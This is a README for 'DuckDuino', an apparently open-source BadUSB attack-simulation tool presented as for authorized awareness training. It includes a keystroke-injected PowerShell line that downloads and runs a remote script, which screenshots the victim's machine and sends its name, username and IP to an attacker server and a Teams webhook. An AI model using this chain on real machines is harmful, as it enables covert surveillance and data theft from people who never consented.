# Rubber Ducky-like Attack Simulation Test/Tool

This tool allows you to capture a screenshot, gather system information, and send it to a Microsoft Teams channel using a webhook. It consists of two parts: an Arduino Ducky Script and a PowerShell script.

> :warning: **Disclaimer**
    This tool is intended for educational and testing purposes only. It is designed to simulate a USB attack for security engineering and awareness training. Use responsibly and only on systems you are authorized to test.

## Materials

- [HiLetgo BadUsb Beetle Bad USB Microcontroller ATMEGA32U4](https://www.amazon.com/gp/product/B07W5K9YHP/ref=ppx_yo_dt_b_asin_title_o01_s00?ie=UTF8&psc=1) (Amazon)

## Software Used

- [Arduino IDE](https://www.arduino.cc/en/guide/linux)
- [Ducky Script to Arduino Converter](https://elrock.gitlab.io/ducky2arduino/)


## Prerequisites

- An Arduino device with an ATMEGA32U4 Microcontroller.
- An internet-connected computer running Windows with PowerShell.
- Access to a Microsoft Teams channel with a configured incoming webhook.
- A web server where you can host the PowerShell script.
  
## Installation

#### 1. Install Python and pip:

```bash
sudo apt update
sudo apt install python3
sudo apt install python3-pip
```
#### 2. Clone or download this project to your computer.
```bash
git clone https://github.com/remoteicu/DuckDuino.git
```

#### 3. Open a terminal and navigate to the project directory.
##### Directory Structure
```bash
- app.py                 # Python script to start the web server that listens for a request
- uploads/               # Directory for uploaded files and the PowerShell script
    - run.ps1
- requirements.txt       # Python package dependencies
```
#### 4. Create a virtual environment (optional but recommended):
```bash
python -m venv venv
```
#### 5. Activate the virtual environment:
On macOS and Linux:
```bash
source venv/bin/activate
```
On Windows (PowerShell):
```powershell
.\venv\Scripts\Activate
```
#### 6. Install the required Python packages:

```bash
pip install -r requirements.txt
```
## Configuration

### Arduino Script

1. Copy the provided [Arduino Script](duino.ino) to your Arduino device using Arduino IDE.
2. Modify the delays and keypresses in the Script as needed for your setup.
> **_NOTE:_**  Make sure to select `Arduino Leonardo` under tools > board > boards manager, as well as select the correct COM Port.

### PowerShell Script
The script will:
   - Capture a screenshot of the target computer.
   - Gather system information (computer name, username, IP address).
   - Upload the screenshot and information to the web server.
   - Send a message with the screenshot link to the specified Microsoft Teams channel using the webhook.

> **_NOTE:_** Make sure to update the `$UploadUrl` and `$teamsWebhookUrl` variables in the PowerShell script to point to your server's upload endpoint and your teams webhook url.
  
## Usage
Run app.py:
```bash
python app.py
```
## Extra Options
1. Point your domain DNS to your remote server IP
2. Get an ssl certificate from letsencrypt by utalizing [certbot](https://certbot.eff.org/)
Install Certbot
```bash
sudo snap install --classic certbot
```
Prepare Certbot Command
```bash
sudo ln -s /snap/bin/certbot /usr/bin/certbot
```
Install the Cert
```bash
    sudo certbot certonly --standalone
```
3. Fill out the prompts with your domain information
4. Add the following to `app.py`
```python
from flask import Flask, request, jsonify, send_from_directory
import os
import json
import base64
from datetime import datetime
import pytz
from flask_sslify import SSLify

app = Flask(__name__, static_url_path='/uploads', static_folder='uploads')
sslify = SSLify(app)

# ... (Rest of your code remains the same)
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=443, ssl_context=('/etc/letsencrypt/live/{{your-domain}}/fullchain.pem', '/etc/letsencrypt/live/{{your-domain}}/privkey.pem'))

```
5. Update your arduino script to use the FQDN of your server
```bash
# ...

Keyboard.print("$scriptUrl = 'https://{{your-domain}}/uploads/run.ps1'; Invoke-Expression -Command (Invoke-RestMethod -Uri $scriptUrl)");

# ... (Rest of your code remains the same)
```
7. Setup a Start and Stop shell script and put them in the root directory
Start.sh
```bash
#!/bin/bash

nohup python app.py > /dev/null 2>&1 &

echo "Flask app started with PID: $!"
```
Stop.sh
```bash
#!/bin/bash

pid=$(pgrep -f "python app.py")
if [ -n "$pid" ]; then
  echo "Stopping Flask app (PID: $pid)..."
  kill "$pid"
  echo "Flask app stopped."
else
  echo "Flask app is not running."
fi
```


## Troubleshooting

- If you encounter issues, ensure that your Arduino device is properly configured and connected.
- Check the PowerShell script for any errors and make sure it is hosted on a reachable server.

## License

This project is licensed under the MIT License - see the [LICENSE.md](LICENSE.md) file for details.
